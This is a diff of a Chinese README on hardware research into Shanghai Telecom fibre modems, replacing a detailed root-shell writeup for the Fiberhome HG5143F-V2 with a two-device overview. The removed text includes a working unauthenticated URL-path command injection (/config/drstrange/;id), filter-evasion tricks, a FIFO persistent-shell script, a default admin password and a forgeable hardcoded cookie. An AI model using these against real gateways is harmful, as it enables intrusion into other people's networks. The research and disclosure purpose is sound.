@@ -1,496 +1,142 @@
-# 烽火 HG5143F-V2 电信 SDN 光猫开启 Root Shell
+# 上海电信 10G-EPON 光猫研究：HG5143F-V2 与 F7015TV3
 
-> 中国电信「智能随选网关」（SDN 版）本地提权与二次开发记录
-> 固件 `FHQZ.4.0.0` · Broadcom **BCM68560** · aarch64 · Linux 4.1.52
+同一条家庭宽带线上，先后折腾过的两台光猫的完整记录 —— 一台是**怎么进得去**，一台是**怎么换得掉**。
 
----
-
-## 0. 结论先行
-
-| 目标 | 结果 |
-|---|---|
-| 打开 SSH / telnet | ❌ **做不到**（硬件转发层白名单，非配置问题） |
-| 拿到 root shell | ✅ **可以**，走 Web 注入点 |
-| 持久化交互式 shell | ✅ 可以，用 FIFO + 常驻 `sh`，见第 4 节 |
-| 重启后保留改动 | ❌ `/` 是只读 squashfs，`/etc` 走内存 overlay，必回滚 |
-| 关掉自带 WiFi | 运行时 ✅ 立刻生效；**持久化 ❌ 做不到**，见第 7 节 |
-
-一句话总结：**这台设备的 `22/23` 端口在交换芯片层面就被封死了，但它的 Web 服务里藏着一个 root 权限的命令注入点。**
-
-网上流传的 `HG5143F 开 telnet` 教程（`/cgi-bin/telnetenable.cgi`、`192.168.1.1:8080/cgi-bin/luci`、`/html/logoffaccount.html`）针对的是**「天翼网关 4.0」**固件，和本文的**「智能随选网关（SDN）」**是两套完全不同的软件栈。本文所有结论均来自实机验证。
+> 仓库名 `SH-SDN` 沿用最初的研究对象（上海电信 SDN 网关）。后来补上了替换猫的换机手册，
+> 现在是一个「同线路、两台设备」的合集。
 
 ---
 
-## 1. 设备与固件指纹
+## 1. 两台设备
 
-先确定自己在跟什么东西说话，避免拿错教程。
-
-```bash
-curl -s -i http://192.168.1.1/ | head -20
-# Server: sdngw          <- 烽火 SDN 网关固件的 Web 服务名
-```
-
-| 项 | 值 |
-|---|---|
-| 厂商 / 型号 | Fiberhome **HG5143F-V2** |
-| 硬件 / 软件版本 | V4.0.0 / **FHQZ.4.0.0** |
-| 主控 | **BCM68560**（Broadcom，交换 + 硬件流表加速） |
-| 系统 | aarch64，Linux **4.1.52** |
-| 根文件系统 | `/` = ubiblock squashfs，**只读且 100% 占满** |
-| 可写区 | `/tmp` = 222MB tmpfs；`/etc` 改动落在内存 overlay |
-| Web 页面 | 仅 `login.html` `index.html` `reset.html` `setloid.html` `dhcpmsg.html` |
-
-用设备的 `ctapi` 可以拿到全量身份信息（无需登录）：
-
-```bash
-ctapi sys get sys_all
-```
-
-```
-sn:D8F507-XXXXXXXXXXXXXXXXXXXX
-mac_address:D8:F5:07:XX:XX:XX
-fw_version:FHQZ.4.0.0
-hw_version:V4.0.0
-model:HG5143F-V2
-chipmodel:BCM68560
-vendor:Fiberhome
-region:SH
-```
-
----
-
-## 2. 认证机制（顺带的一个安全问题）
-
-登录页只有一个管理密码框，实际请求是：
-
-```
-GET /login/passwd/<base64(密码)>
-```
-
-成功返回 `Set-Cookie: _SDNGWWEBTOKEN=20170601` 并跳转 `/index.html`。
-
-做对照实验能确认它不是「任何密码都放行」：
-
-| 输入 | 响应 |
-|---|---|
-| 正确密码 | 设 cookie → 跳 `/index.html` |
-| 错误密码 | 跳回 `/login.html` |
-
-> ⚠️ **两个安全问题**
-> 1. 该型号出厂/默认管理密码为 `sdn123456`（本文实测有效）。弱口令 + 局域网可直达。
-> 2. 认证 cookie 是**硬编码常量 `20170601`**，与会话无关，可被任意伪造。
->
-> 也就是说：任何接入该局域网的人都能直接登进这台网关。建议在电信 App 内修改管理密码。
-
----
-
-## 3. 注入点
-
-灵感与初始线索来自 [haoqi366/SDN_research](https://github.com/haoqi366/SDN_research)。核心发现是 Web 服务把 **URL 路径**直接拼进了 shell 命令：
-
-```sh
-sh -c ctapi sys get secret_iv ;<URL 路径>
-```
-
-路径里的 `;` 完成了命令拼接。因此：
-
-```
-GET /config/drstrange/;id
-```
-
-即可执行 `id`，且直接是 **root**。
-
-### 3.1 三个必须知道的约束
-
-**① 只有 stderr 会回显**
-
-CGI 不返回 stdout，只把 stderr 回显到 HTTP 响应体。所以要「偷」stdout，用 `mkdir` 把输出当成目录名参数，让报错信息把它吐出来：
-
-```sh
-mkdir -- "$(id)"
-# -> mkdir: cannot create directory 'uid=0(root) gid=0(root)': No such file or directory
-```
-
-**② 空格和斜杠要换掉**
-
-```
-空格 -> ${IFS}
-/    -> ${HOME}      # 本机 $HOME 恰好是 /
-```
-
-**③ 带 fd 的重定向会失效**
-
-这一点很反直觉，踩过坑：
-
-```sh
-echo hi > /tmp/t1      # ✅ 可以，独立的 > 单独成词，仍被识别为重定向
-cmd 2>/tmp/e           # ❌ 不行，2> 作为整体 token 展开后不再被解析为重定向
-ffmpeg ... 2>file      #    → 目标程序会收到一个名叫 "2" 的普通参数
-```
-
-**结论：需要复杂引号 / 重定向时，把脚本 base64 写进文件再执行，别硬拼一行。**
-
-### 3.2 客户端
-
-`onu_shell.py` 是无状态单命令客户端：
-
-```bash
-python onu_shell.py "id"
-python onu_shell.py "cat /etc/passwd"
-```
-
----
-
-## 4. 持久化 shell（本项目的主要贡献）
-
-上面的注入点每次都是独立的 `sh -c`，没有状态：`cd` 不保留、变量不保留、后台进程活不过一次请求。
-
-用 **FIFO + 常驻 sh** 解决：
-
-```sh
-#!/bin/sh
-exec 9<>/tmp/.ci     # 关键：脚本自己以读写方式持有 FIFO
-cd /
-sh </tmp/.ci >/tmp/.co 2>&1
-```
-
-**为什么需要 `exec 9<>`：** FIFO 的读取端在最后一个写端关闭时会收到 EOF。如果只用 `echo cmd > /tmp/.ci` 逐条写入，每写完一次读取端就 EOF 退出，shell 只活一条命令。让脚本自身以 **O_RDWR** 打开并持有该 FIFO，写端就永远存在，读取端不会看到 EOF，一个 `sh` 可以跨无数条命令存活。
-
-配套两点：
-
-- **命令用 base64 传输** → 彻底绕开引号 / 空格 / 斜杠的转义地狱
-- **哨兵判断输出结束** → 命令后追加 `echo __DONE__$?`，轮询 `/tmp/.co` 直到出现哨兵
-- **分块读取** → `tail -c +N /tmp/.co | head -c 2400`，单次不超过 `PATH_MAX`（4096）
-
-> 踩坑：外层脚本**不要**写成 `exec sh <fifo`。那样 argv 会变成裸 `sh`，`ps` 里再也认不出这个会话，无法做存活检测。
-
-效果：
-
-```
-onu# cd /etc
-onu# pwd
-/etc
-onu# X=42; echo $X
-42
-onu# ls /nope; echo rc=$?
-ls: /nope: No such file or directory
-rc=1
-```
-
-`cd`、变量、后台任务、stderr、退出码全部跨命令保留。用 `setsid` 起的进程能长期存活（实测 dropbear 连续运行十几分钟）。
-
-`onu_console.py` 支持：
-
-```bash
-python onu_console.py                 # 交互式
-python onu_console.py "df -h"         # 单条
-python onu_console.py --restart       # 会话重建（重启后会自动重建，无需手动）
-```
-
----
-
-## 5. 为什么 22/23 端口永远打不开（负面结果，避免后来者踩坑）
-
-这部分比成功经验更有价值——**不要再在这个方向上浪费时间**。
-
-### 5.1 排除法
-
-| 检查 | 结果 | 结论 |
+| | 烽火 **HG5143F-V2** | 中兴 **ZXHN F7015TV3** |
 |---|---|---|
-| `iptables -L -n`（filter/nat/mangle/raw 四表） | **全空** | 不是 netfilter 拦的 |
-| PC → 网关 `22/23/9999/8443` | 全部 **~2.0s 后 RST** | 不是丢包，是被主动回绝 |
-| PC → 网关 `80` | 200，23ms | 只有 80 通 |
-| `netstat -ln` | 22 端口 `0.0.0.0:22 LISTEN` | 服务起来了，但外面连不上 |
+| 角色 | 电信原配「智能随选网关」（SDN 版） | 自购替换，纯桥接 |
+| 固件 | `FHQZ.4.0.0` / HW `V4.0.0` | `V4.3.0P1T1` |
+| 主控 / 系统 | Broadcom **BCM68560** · aarch64 · Linux 4.1.52 | aarch64 · Linux 5.4.196 · BusyBox 1.17.2 |
+| 上网方式 | **IPoE / DHCP**（设备内无 PPPoE 凭据） | Bridge · VLAN 0，由 RouterOS 拨 PPPoE |
+| 22/23 端口 | ❌ 交换芯片层封死，软件无解 | ✅ 可开（webFac 工厂接口） |
+| 本地 root | ✅ 靠 Web 命令注入，非持久 | ✅ 靠 Telnet，`/userconfig` 持久 |
+| 持久化改动 | ❌ `/` 只读 squashfs，重启回滚 | ✅ 可写持久分区，但有恢复出厂风险 |
+| 详细文档 | [hg5143f/](hg5143f/) | [f7015tv3/](f7015tv3/) |
 
-### 5.2 真正的根因：OVS 流表白名单
-
-```bash
-ovs-ofctl dump-flows SDN-bridge | grep 192.168.1.1
-```
-
-```
-table=1 priority=125 tcp,nw_src=192.168.1.0/24,nw_dst=192.168.1.1,tp_dst=80 → resubmit(,4)
-table=1 priority=125 tcp,nw_src=192.168.1.1,nw_dst=192.168.1.0/24,tp_src=80 → resubmit(,4)
-```
-
-**全表只有这两条把流量送往 CPU 口（`table=4 → output:100`）的放行规则，且只针对 80 端口。**
-
-试着补一条 22 端口的镜像规则：
-
-```bash
-ovs-ofctl add-flow SDN-bridge "table=1,priority=125,tcp,tp_dst=22,actions=resubmit(,4)"
-# ovs-ofctl: switch does not support any of the usable flow formats
-ovs-ofctl -O OpenFlow13 add-flow ...
-# OFPT_ERROR (OF1.3): OFPBRC_BAD_TYPE
-```
-
-这是**厂商改过的 OVS**（`/usr/ovs/sbin/cm` + `dm`，控制器 `tcp:15.192.24.125:6633`），只允许云端控制器装流，本地只读不写。
-
-### 5.3 更底层：转发在交换芯片里
-
-`ps` 里能看到：
-
-```
-bcmsw_rx          # Broadcom 交换芯片收包线程
-bcmFlwStatsTask   # 硬件流表统计
-recycle_sysb      # 缓冲区回收
-```
-
-数据转发、NAT、VLAN 全部在 BCM68560 的**硬件流表**里完成，CPU 只是旁挂管理面。芯片对非白名单端口直接回 RST —— 这就是那精确 2 秒的来源（DoS 防护特性）。
-
-**所以 `sshd`/`telnetd` 起得来、`netstat` 看得见 LISTEN、但外部 SYN 到不了 CPU。软件层做任何事都没用。**
-
-### 5.4 也试过、也失败的路径
-
-- **抢 80 端口**：`killall micro_inetd` 后把 dropbear 挂到 80，能握手成功拿到 `SSH-2.0-dropbear_2019.78`，但随后进程被杀，且 **Web 管理页与注入通道同时失效，只能断电重启恢复**。已实测两次，不建议尝试。
-- **IPv6 绕过**：流表白名单只写了 `nw_dst`（IPv4）。但 `ip -6 addr add fe80::1/64 dev si` 返回 `Permission denied` —— httpd 所在命名空间没有 `CAP_NET_ADMIN`，改不了接口。
-- **自己传 busybox + telnetd**：设备自带 `/bin/busybox` v1.30.1 **未编译 telnetd**；Alpine 的 `busybox-static` 也没有；只有 Debian 的 `busybox-static` 带。但传上去也连不上，端口被芯片拦。（如果确实需要全量 busybox：`busybox-static_1.30.1-6+b3_arm64.deb`，aarch64 静态链接。）
-- **改 OVS fail-mode**：`secure → standalone` 只在控制器失联时生效，控制器在线时不起作用。
-
-### 5.5 唯一能拿到「真终端」的路
-
-```bash
-ps | grep getty
-# 1113 root /sbin/getty -L ttyS0 0 vt100
-```
-
-**串口上已经有 login 提示符了。** 拆机找到主板 UART 焊盘，接 3.3V USB-TTL：
-
-- 电平：**3.3V**（不要用 5V，会烧）
-- 参数：**115200 8N1**
-- 接线：TX↔RX 交叉、RX↔TX、GND↔GND（**VCC 不要接**）
-
-这是唯一能拿到可交互、可 `scp`、可断线重连的真终端的路径。
+**为什么会有这两台**：原猫是 SDN 版，配置所有权在云端控制器，本地既关不掉自带 WiFi，
+也换不了软件栈。于是买了 F7015TV3 做纯桥接，把拨号、NAT、WiFi 全部搬到自己的 RouterOS 上。
 
 ---
 
-## 6. 附：这台机器的网络架构（换光猫时有用）
+## 2. 这条线路的技术底牌（两台设备互证）
 
-虽然是从 dump 里顺带挖出来的，但对「把这台换成自己的光猫/光模块」很有价值。
+下面每一项都在两台机器上分别验证过，不是从文档抄的：
 
-### 6.1 多命名空间设计
-
-```bash
-ip netns list
-# APP  FM  MNG  NM  obox  acprobe
-```
-
-| 命名空间 | 接口 | 地址 | 用途 |
-|---|---|---|---|
-| `NM` | `si` | 192.168.1.1/24 | LAN / Web |
-| `MNG` | `manager` | 由 `udhcpc` 获取 | 管理 WAN（TR-069） |
-| `FM` | `foi` | 192.168.1.254/24 | 光纤管理面 |
-| `APP` | `appi` | 192.168.1.253/24 | 应用沙箱 |
-| `obox` | `SDN-out-default` | 192.168.1.1/24 | 上网 WAN 容器 |
-
-### 6.2 VLAN 与 MAC 分配
-
-来自 `/usr/init_scripts/create_vlandev.sh` 的原文注释：
-
-```
-# veip0.1(for PPP):  vlan00  -  basemac+2
-# manager:           vlan46  -  basemac+3
-# iptv.xx(1):        vlan85  -  basemac+4
-# iptv.xx(2):        vlan51  -  basemac+5
-# sip:               vlan46  -  basemac+6
-```
-
-| 业务 | VLAN | MAC 偏移 |
+| 项 | 值 | 验证方式 |
 |---|---|---|
-| 上网（PPPoE） | 0（不打标签） | base **+2** |
-| 管理 TR-069 | **46** | base **+3** |
-| IPTV 1 | **85** | base **+4** |
-| IPTV 2 | **51** | base **+5** |
-| VoIP SIP | 46 | base **+6** |
+| PON 制式 | **10G-EPON**（非对称，`XEPON_ASY`） | 原猫 `ctapi pon get pon_type`；新猫插纤即注册，无需切模式 |
+| 认证 | LOID `XXXXXXXXXX`（10 位数字），上海 `PONPASSWD` 为空 | 原猫 `ctapi pon get loid`；新猫 `setmac 2 2180` 回读 |
+| 上网 VLAN | **0 —— 不打标签** | 原猫 ovsdb `WANConnection` 表实读；新猫 WAN 配 Bridge/VLAN 0 后拨号成功 |
+| IPTV VLAN | **85 / 51** | 原猫 `iptv.85` / `iptv.51` 端口 + 硬件流表 |
+| 管理 VLAN | **46** | 原猫 `dm_addr.conf` + 运行时接口 |
+| 光功率 | Rx **−22 ~ −23 dBm**（良好，余量约 5 dB） | 两台机器的 DDM 读数 |
+| 区域码 | **205 = 上海**，206 = 重庆（中兴 `upgradetest` 体系） | 新猫三处交叉验证，见 [f7015tv3/README.md](f7015tv3/README.md) |
 
-基础 MAC 在 `/var/run/base_mac`。各业务 MAC 由此递增派生 —— **部分局端按 MAC 做绑定，换猫时要照着配。**
-
-> ⚠️ 上面的 VLAN 值来自源码注释，属于「设计意图」。**运行时真值已另外实测确认**，
-> 见 [docs/network-dump.md](docs/network-dump.md) 第 6 节：从 ovsdb 的 `WANConnection`
-> 表读出 `bridge0 → vlan 0`、`iptv.85 → vlan 85`、`iptv.51 → vlan 51`，并实测验证了
-> MAC 的 +4 / +5 派生关系。
->
-> 一个反直觉的结论：**这台设备上网不是 PPPoE，是 IPoE + VLAN 0 不打标签。**
-> `/etc/ppp` 不存在、`create_WAN.sh` 里 PPPoE 分支只有 `#TODO` 占位。
-> 所以「换光猫要抄宽带账号密码」在这条线路上并不成立 —— 设备里没有这个凭据。
-
-### 6.3 控制器与 DNS
-
-```bash
-# /usr/etc/dm_addr.conf
-# <Region> <HA address> <MNG vlan> <NTP> <login msg>
-SH  sgwauth.edatahome.com  46  15.192.251.5|15.192.252.5  c2RuMTIzNDU2
-```
-
-- 登录报文 base64 `c2RuMTIzNDU2` 解码 = `sdn123456`
-- 该报文为**区域内所有设备共用的固定凭据**，不是每机随机
-- SDN 控制器：`tcp:15.192.24.125:6633`
-- DNS：`15.192.252.188` / `15.192.251.188`（电信上海）
-- NTP：`15.192.251.5` / `15.192.252.5`
-
-### 6.4 PON 注册参数
-
-```bash
-ctapi pon get loid        # LOID
-ctapi pon get gpon_sn     # ONU SN（hex）
-ctapi pon get pon_type    # 10GEPON
-ctapi pon get pon_state   # success
-```
-
-`gpon_sn` 返回十六进制，前 4 字节是厂商前缀（Fiberhome = `46485454` = ASCII `FHTT`）。
-
-> ⚠️ **LOID 相当于这条线路在光路里的身份证**，与宽带账号绑定。公开仓库里请务必打码。
+> ⚠️ 各地电信的 VLAN 规划并不统一，上表只对**上海**这条线路成立。
+> 换机前请用原猫实测确认，不要照抄网上的通用教程。
 
 ---
 
-## 7. 关掉自带 WiFi：运行时可以，持久化不行
+## 3. 两条技术路径
 
-场景很常见：光猫后面接自己的路由器拨号 + 自己的 AP，光猫自带的 2.4G/5G 只是同频干扰源，想关掉。
+### 路径 A —— 进得去（HG5143F）
 
-### 7.1 运行时立刻关掉（有效）
+设备把 SSH/Telnet 端口在**交换芯片层面**封了，但 Web 服务里有个 root 权限的命令注入点。
+由此做了三件事：
 
-厂商给了一个 `ctapi` 子接口，不需要改任何配置文件：
+1. 把一次性注入改造成**持久化交互式 shell**（FIFO + 常驻 `sh`，`exec 9<>` 避免读端 EOF）
+2. 逐层证明「22/23 端口打不开」的**真正原因**在 OVS 流表白名单 + BCM68560 硬件转发，不在 netfilter
+3. dump 出完整网络架构（命名空间 / VLAN-MAC 派生 / SDN 控制器），**这份 dump 直接成了换猫的依据**
 
-```bash
-ctapi wl set 24g_radio off
-ctapi wl set 5g_radio off
-```
+→ [hg5143f/README.md](hg5143f/README.md) · [hg5143f/network-dump.md](hg5143f/network-dump.md)
 
-几秒内 hostapd 退出、信标消失，`wl0.vif` / `wl1.vif` 变为 DOWN：
+### 路径 B —— 换得掉（F7015TV3）
 
-```bash
-ip netns exec MNG ip link show wl0.vif    # state DOWN
-```
+拿到原猫的真实参数后，按固定顺序操作新猫：开 Telnet → 全分区备份 → 改区域码 → 重开 Telnet →
+写 LOID → 屏蔽 ITMS/TR-069 → 禁用语音 WAN → 插纤验证。
 
-想恢复就 `... on`。键名规律看起来是 `<24g|5g>_<radio|ssid|channel|power|...>`，
-不过本文只实际验证了 `*_radio on/off` 这一对。
+19 条踩坑记录，其中最关键的两条：
+- **`sendcmd 1 DB set GPONCFG Loid` 是无效的**，该字段 `bSave=0` 不入库，必须用 `setmac 1 2180`
+- **`sdefconf` 改区域码会恢复出厂并清掉 Telnet**，所以备份和开 Telnet 必须排在它前面
 
-### 7.2 但它只改 tmpfs 里的东西
-
-`ctapi wl` 实际改的是 `/tmp/wlan1.conf`、`/tmp/wlan2.conf` —— `/tmp` 是 tmpfs，**重启即失**。
-WiFi 的权威配置在 ovsdb 配置库里：
-
-```bash
-sed -n '4p' /usr/local/db/conf.db | grep -aoE '"WLAN_RADIO":\{.{0,600}'
-```
-
-```
-{"radio_band":"2.4G","radio_mode":"802.11ax","radio_enable":1,"power":1, ...}
-{"radio_band":"5G",  "radio_mode":"802.11ax","radio_enable":1,"power":1, ...}
-```
-
-`WLAN_SSID` 表里对应着 `ssid_name` / `ssid_password` / `ssid_broadcast`。
-**把 `radio_enable` 改成 0 才是持久化的正解** —— 但这台机器上改不动，原因如下。
-
-### 7.3 为什么直接改 `conf.db` 不行
-
-两个障碍，第一个能绕，第二个绕不过：
-
-**① 文件头带长度和校验**
-
-`conf.db` 不是裸 JSON，第一行是 `OVSDB JSON <字节长度> <sha1>`，正文和头必须自洽。
-用 sed 原地替换（`"radio_enable":1` → `:0`）虽然字节长度没变，但 sha1 必然变成对不上的值：
-
-```bash
-head -c 60 /usr/local/db/conf.db
-# OVSDB JSON 173095 6b2c...（长度 + 数据段 sha1）
-```
-
-实测改完后立刻比对：头部声明的 `<len> <sha1>` 已经和新的数据段对不上。按 OVSDB 规范，
-读取方会判定该文件损坏，所以当场从备份恢复、没有再往下试 —— 继续试的代价是管理面异常加
-反复断电重启（本文档前面已经因为别的原因重启过两次），收益只是让 WiFi 静音，不值得。
-理论上可以按这个格式自己重算头（sha1 覆盖数据段），但见第 ②。
-
-**② 内存里的副本会覆盖你的修改**
-
-`cm` 和 `ovsdb-server` 常驻，各自持有这份配置的内存副本，并会在状态变化时**回写整个文件**。
-就算你把静态文件连同校验头改得完美无缺，只要进程还在跑，它的下一次 commit 就会用内存状态覆盖回去；
-而如果你把进程杀掉再改，`cm` 重启后又会走「向云端控制器要配置」的流程重新下发。
-
-**这就是 SDN 网关和传统光猫的根本区别：配置的所有权在云端，本地文件只是缓存。**
-
-### 7.4 试过但走不通的兜底思路
-
-| 思路 | 结果 |
-|---|---|
-| 开机脚本里跑一次 `ctapi wl set ... off` | 写入点只有 `/etc`（内存 overlay）和 `/tmp`，都过不了重启；`/usr/local` `/fhconf` 虽为 ubifs 持久分区，但启动流程不读那里的自定义脚本 |
-| 用 `crond` 定时兜底 | **`crond` 根本没在跑**；`/fhrom/fhshell/crond_start.sh`（其他固件里存在）在本机不存在 |
-| 改 nvram | 本机有 `/bin/nvram` + `kernel_nvram.setting`，但能读到的键都是射频校准参数，没找到对应 `radio_enable` 的键。这条**只做到一半**，因决定终止研究而放弃 |
-| `ubus` / `wlan_mgr_ubus_config` | 都在，但它们是 `wlan_mgr` 的运行期接口，背后读的仍是 ovsdb 那份配置；没找到能改「下次启动是否 enable」的方法 |
-| 改 `/usr/local/db/conf.db` | 见 7.3，校验 + 回写双重障碍 |
-
-### 7.5 结论
-
-**这台设备上「持久化关掉 WiFi」做不到，除非能改云端下发的配置（做不到，也不该做）。**
-
-重启后 WiFi 会自己回来。如果只是不想被干扰，工程上更现实的办法：
-
-- 把自己的 AP 信道挪开，别和光猫重叠（2.4G 只用 1/6/11，5G 避开 DFS 与 149 以上重叠段）
-- 光猫物理上挪远一点，或者塞进弱电箱 —— 金属箱对 2.4G 的衰减很可观
-- 换个不带 WiFi 的纯桥接光猫 / 光模块（本文档第 6 节的参数就是为这个准备的）
-
-> ⚠️ 别尝试 `rm` 掉 `/tmp/wlan*.conf` 或者 `killall hostapd` 了事。前者会被 `wlan_mgr` 重建，
-> 后者会被拉起；两者都只影响运行期，和 `ctapi wl set off` 等价但更容易让 WiFi 进异常状态。
+→ [f7015tv3/README.md](f7015tv3/README.md)
 
 ---
 
-## 8. 快速上手
+## 4. 两台设备教给我们的六件事
 
-```bash
-# 1. 确认注入点存在（返回 000 = 固件没有这个洞，直接放弃）
-curl -s -o /dev/null -w "%{http_code}\n" "http://192.168.1.1/config/drstrange/;id"
+1. **先判断固件血统，再找教程。** 网上「HG5143F 开 telnet」的教程全部针对「天翼网关 4.0」，
+   而 SDN 版是另一套软件栈（`Server: sdngw`）。版本号对不上就先停手。
+2. **参数存在哪，决定了怎么改。** 三种存储，三种改法，混用必失败：
+   - cspd 配置库（`sendcmd 1 DB`）—— 有 `bSave` 列，`bSave=0` 的字段改了不持久
+   - flash TagParam（`setmac`）—— LOID / SN / MAC 真正落盘处，加密存储
+   - ovsdb（`/usr/local/db/conf.db`）—— SDN 版专用，带 `OVSDB JSON <len> <sha1>` 头校验，且被常驻进程回写
+3. **交叉验证，别信单一来源。** 「区域码生效了吗」看 `db_default_cfg.xml` 字节数（8136 vs 6872）；
+   「上网 VLAN 多少」读 ovsdb 而不是看源码注释；博客说 VLAN 1，实测是 VLAN 0。
+4. **负面结果比成功经验值钱。** 「22/23 打不开」「WiFi 持久化关不掉」「`vlanctl` 在本机一律报错」
+   这三条结论，能帮后来者省掉几天时间。
+5. **顺序即安全。** 备份在恢复出厂之前，屏蔽 ITMS 在插纤之前。顺序错了不可逆。
+6. **只读先跑通，再谈改动。** 所有诊断都先在只读模式下拿到基线，改之前留快照。
 
-# 2. 单命令
-python onu_shell.py "id"
+---
 
-# 3. 持久 shell
-python onu_console.py
+## 5. 目录结构
+
+```
+.
+├── README.md                  ← 本文件：概述与导航
+├── hg5143f/                   ← 原猫：SDN 网关提权与网络剖析
+│   ├── README.md              ← 注入点、持久 shell、22/23 端口为何不可达
+│   ├── network-dump.md        ← 实机网络 dump（换猫依据）
+│   ├── onu_shell.py           ← 无状态单命令客户端
+│   └── onu_console.py         ← 持久化交互式 shell
+├── f7015tv3/                  ← 新猫：换机手册
+│   ├── README.md              ← 开 Telnet → 备份 → 改区 → 写 LOID → 屏蔽 ITMS
+│   └── tools/
+│       ├── read_optical.py        ← 光功率采样与 dBm 换算
+│       ├── onu_telnet_admin.py    ← Telnet 密码试错 / dump TelnetCfg / 改密码
+│       └── verify_backup.py       ← 分区镜像离线校验（尺寸 + SHA256 + CRC）
+└── docs/
+    └── anonymization.md       ← 脱敏说明：哪些值被隐去、为什么
 ```
 
-无需登录。`/config/drstrange/` 这个注入点不校验认证。
+---
+
+## 6. 脱敏说明
+
+仓库里所有设备标识都已打码：**LOID、SN、MAC、Telnet 密码、WiFi SSID/PSK** 一律为占位符。
+
+保留的「半公开」信息及理由见 [docs/anonymization.md](docs/anonymization.md) ——
+主要是厂商**出厂超密**（区域内统一，属于厂商侧缺陷）和**区域码**（固件内置映射表，32 行明文）。
 
 ---
 
-## 9. 免責 / 合规
+## 7. 免责与合规
 
-- 本文仅针对**自己拥有或已获授权**的设备。未经授权访问他人网络设备在绝大多数司法辖区都是违法的。
-- 修改 `/etc`、启动服务、写交换芯片寄存器都有变砖风险。`/` 是只读 squashfs，误改根分区可能导致无法启动，只能靠串口或返修恢复。
-- 拆机接线接错电平会**永久损坏**设备（3.3V，别接 VCC）。
-- 文中涉及的默认密码、cookie 常量等问题，属于厂商侧的安全缺陷。**请勿用于攻击他人设备**；如果你是自己设备的用户，建议向运营商报备并修改密码。
-
----
-
-## 10. 鸣谢
-
-本项目的起点完全来自 **[haoqi366/SDN_research](https://github.com/haoqi366/SDN_research)**。
-
-那篇研究首次公开了这条利用链最关键的一环 —— Web 服务把 URL 路径直接拼进
-`sh -c "ctapi sys get secret_iv ;<路径>"`，也是「用 `mkdir $(cmd)` 把 stdout 借 stderr 带出来」
-这一技巧的来源。没有它，本文大概率会停在「22/23 端口打不开、网上教程全不适用」这一步。
-
-本文在其基础上的增量主要有五点：
-
-- 确认该注入点在 **FHQZ.4.0.0（智能随选网关 / SDN 版）** 上依然有效，且**直接就是 root**
-- 逐层定位 **22/23 端口不可达的真正原因**：OVS 表 1 只有 `tp_dst=80` 两条白名单流，
-  转发实体在 BCM68560 硬件；并记录了 `ovs-ofctl add-flow` 被 `OFPBRC_BAD_TYPE` 拒绝这一关键负面结果
-- 把一次性命令通道改造成**持久化交互式 shell**（`exec 9<>` 持有 FIFO，避免读端收到 EOF）
-- 补上该机型的**网络架构 dump**（命名空间 / VLAN-MAC 派生 / 控制器），供换光猫时对照
-- 划清「关掉自带 WiFi」的边界：运行时 `ctapi wl set ... off` 有效，但配置所有权在云端 ovsdb，
-  `conf.db` 带 `OVSDB JSON <len> <sha1>` 头校验且会被常驻进程回写 —— **持久化不可行**（第 7 节）
-
-原仓库的许可条款请以其仓库内声明为准。
-
-其他参考：
-
-- Broadcom `vlanctl` / OVS `ovs-ofctl` 官方文档
-- Linux `openflow` / OVS 流表相关 man page
+- 所有操作均在**自己拥有 / 已获授权**的设备上进行。未经授权访问他人网络设备在绝大多数司法辖区违法。
+- 改区域码会**恢复出厂**，写交换芯片寄存器、刷分区有**变砖风险**，恢复多半只能靠串口或返修。
+- 拆机接线接错电平会**永久损坏**设备（3.3V TTL，别接 VCC）。
+- 文中提到的默认密码、硬编码 cookie、未授权信息泄露接口，属于厂商侧安全缺陷。
+  **请勿用于攻击他人设备**；如果你是自己设备的用户，建议改掉密码并向运营商报备。
 
 ---
 
-## 11. 文件说明
+## 8. 参考资料
 
-| 文件 | 说明 |
-|---|---|
-| `onu_shell.py` | 无状态单命令客户端（最小实现，适合排错） |
-| `onu_console.py` | 持久化交互式 shell（FIFO + 常驻 `sh`） |
-| `docs/network-dump.md` | 实机网络配置 dump（换猫参考） |
+- [haoqi366/SDN_research](https://github.com/haoqi366/SDN_research) —— 本仓库起点，首次公开了 HG5143F 的 URL 路径注入链
+- [qiudz/zte-f7015tv3-telnet-solidify](https://github.com/qiudz/zte-f7015tv3-telnet-solidify) —— F7015TV3 开 Telnet 固化脚本
+- [hack-gpon/hack-gpon.github.io](https://github.com/hack-gpon/hack-gpon.github.io) —— GPON/ONU 总 wiki，改区与刷机流程
+- [douniwan5788/zte_modem_tools](https://github.com/douniwan5788/zte_modem_tools) —— 中兴开 Telnet、权限门控
+- [edisionnano/F8648P](https://github.com/edisionnano/F8648P) —— 中兴 `flag_type` 与命令白名单机制剖析
+- [dreamzone-cc/zudz](https://github.com/dreamzone-cc/zudz) —— 中兴改区 / 解密 / GPON 身份工具集
+
+---
+
+*整理时间：2026-11-22*
